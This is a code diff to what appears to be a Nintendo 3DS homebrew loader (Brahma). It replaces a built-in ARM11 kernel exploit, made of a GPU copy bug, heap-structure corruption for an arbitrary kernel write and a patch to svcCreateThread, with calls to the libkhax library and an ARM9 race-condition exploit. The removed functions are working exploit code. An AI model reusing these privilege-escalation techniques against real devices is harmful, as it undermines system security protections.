@@ -10,6 +10,7 @@
 #include <arpa/inet.h>
 #include "brahma.h"
 #include "exploitdata.h"
+#include "libkhax/khax.h"
 
 
 /* should be the very first call. allocates heap buffer
@@ -32,24 +33,6 @@ u32 brahma_exit (void) {
 void redirect_codeflow (u32 *dst_addr, u32 *src_addr) {
 	*(src_addr + 1) = dst_addr;
 	*src_addr = ARM_JUMPOUT;	
-}
-
-/* exploits a bug that causes the GPU to copy memory
-   that otherwise would be inaccessible to code from
-   a non-privileged context */
-void do_gshax_copy (void *dst, void *src, u32 len) {
-	u32 check_mem = linearMemAlign(0x10000, 0x40);
-	s32 i = 0;
-
-	for (i = 0; i < 20; ++i) {
-		GSPGPU_FlushDataCache (NULL, src, len);
-		GX_SetTextureCopy(NULL, src, 0, dst, 0, len, 8);
-		svcSleepThread(0x400000LL);
-		GSPGPU_FlushDataCache (NULL, check_mem, 16);
-		GX_SetTextureCopy(NULL, src, 0, check_mem, 0, 0x40, 8);
-	}
-	linearFree(check_mem);
-	return;
 }
 
 /* fills exploit_data structure with information that is specific
@@ -81,53 +64,6 @@ s32 get_exploit_data (struct exploit_data *data) {
 	return result;
 }
 
-/* exploits a bug in order to cause the ARM11 kernel
-   to write a certain 32 bit value to 'address' */
-void priv_write_four (u32 address) {
-	const u32 size_heap_cblk = 8 * sizeof(u32);
-	u32 addr_lin, addr_lin_o;
-	u32 dummy;
-	u32 *saved_heap = linearMemAlign(size_heap_cblk, 0x10);
-	u32 *cstm_heap = linearMemAlign(size_heap_cblk, 0x10);
-
-	svcControlMemory(&addr_lin, 0, 0, 0x2000, MEMOP_ALLOC_LINEAR, 0x3);
-	addr_lin_o = addr_lin + 0x1000;
-	svcControlMemory(&dummy, addr_lin_o, 0, 0x1000, MEMOP_FREE, 0); 
-
-	// back up heap
-	do_gshax_copy(saved_heap, addr_lin_o, size_heap_cblk);
-
-	// set up a custom heap ctrl structure
-	cstm_heap[0] = 1;
-	cstm_heap[1] = address - 8;
-	cstm_heap[2] = 0;
-	cstm_heap[3] = 0;
-
-	// corrupt heap ctrl structure by overwriting it with our custom struct
-	do_gshax_copy(addr_lin_o, cstm_heap, 4 * sizeof(u32));
-	
-	// Trigger write to 'address' 
-	svcControlMemory(&dummy, addr_lin, 0, 0x1000, MEMOP_FREE, 0);
-
-	// restore heap
-	do_gshax_copy(addr_lin, saved_heap, size_heap_cblk);
-
-	linearFree(saved_heap);
-	linearFree(cstm_heap);
-	return;	
-}
-
-// trick to clear icache
-void user_clear_icache (void) {
-	s32 i;
-	for(i = 0; i < 16; i++)
-	{
-		//Fills the top screen with random data
-		do_gshax_copy(0x14000000, 0x18000000, 0x46500);
-		do_gshax_copy(0x14046500, 0x18000000, 0x46500);
-	}
-}
-
 /* get system dependent data and set up ARM11 structures */
 s32 setup_exploit_data (void) {
 	s32 result = 0;
@@ -139,18 +75,6 @@ s32 setup_exploit_data (void) {
 		g_arm11shared.va_pxi_regs = g_expdata.va_pxi_regs;
 		result = 1;
 	}
-	return result;
-}
-
-/* Corrupts ARM11 kernel code (CreateThread()) in order to
-   open a door for code execution with ARM11 SVC privileges. */
-s32 corrupt_svcCreateThread (void) {
-	s32 result = 0;
-
-	priv_write_four(g_expdata.va_patch_createthread);
-	user_clear_icache();
-	result = 1;		
-
 	return result;
 }
 
@@ -391,34 +315,24 @@ void exploit_arm9_race_condition (void) {
 	}
 	return;
 }
-
-/* - restores corrupted code of CreateThread() syscall */
-void repair_svcCreateThread (void) {
-	asm volatile ("clrex");
-	
-	CleanEntireDataCache();
-	InvalidateEntireInstructionCache();	
-
-	// repair CreateThread()
-	*(u32 *)(g_expdata.va_patch_createthread) = 0x8DD00CE5;
-			
-	CleanEntireDataCache();
-	InvalidateEntireInstructionCache();	
-
-	return;
-}
+GSP_FramebufferInfo topFramebufferInfo, bottomFramebufferInfo;
 
 /* restore svcCreateThread code (not really required,
    but just to be on the safe side) */
-s32 __attribute__((naked))
-priv_firm_reboot (void) {
-	asm volatile ("add sp, sp, #8\t\n");
-	
-	repair_svcCreateThread();
+s32 priv_firm_reboot (void) {
+	asm volatile ("cpsid aif");
+	u32 *save = (u32 *)(g_expdata.va_fcram_base + 0x3FFFE00);  
+    save[0] = topFramebufferInfo.framebuf0_vaddr;  
+   	save[1] = topFramebufferInfo.framebuf1_vaddr;  
+	save[2] = bottomFramebufferInfo.framebuf0_vaddr;  
+
+// Working around a GCC bug to translate the va address to pa... 
+    save[0] += 0xC000000;  // (pa FCRAM address - va FCRAM address) 
+    save[1] += 0xC000000; 
+    save[2] += 0xC000000; 
+
 	exploit_arm9_race_condition();
-	
-	asm volatile ("movs r0, #0\t\n"
-			 "ldr pc, [sp], #4\t\n");
+	return 0;
 }
 
 /* perform firmlaunch. load ARM9 payload before calling this
@@ -430,9 +344,9 @@ s32 firm_reboot (void) {
 	fail_stage++; /* platform or firmware not supported, ARM11 exploit failure */
 	if (setup_exploit_data()) {
 		fail_stage++; /* failure while trying to corrupt svcCreateThread() */
-		if (corrupt_svcCreateThread()) {
+		if (khaxInit() == 0) {
 			fail_stage++; /* Firmlaunch failure, ARM9 exploit failure*/
-				svcCorruptedCreateThread(priv_firm_reboot);
+			svcBackdoor(priv_firm_reboot);
 		}
 	}
 
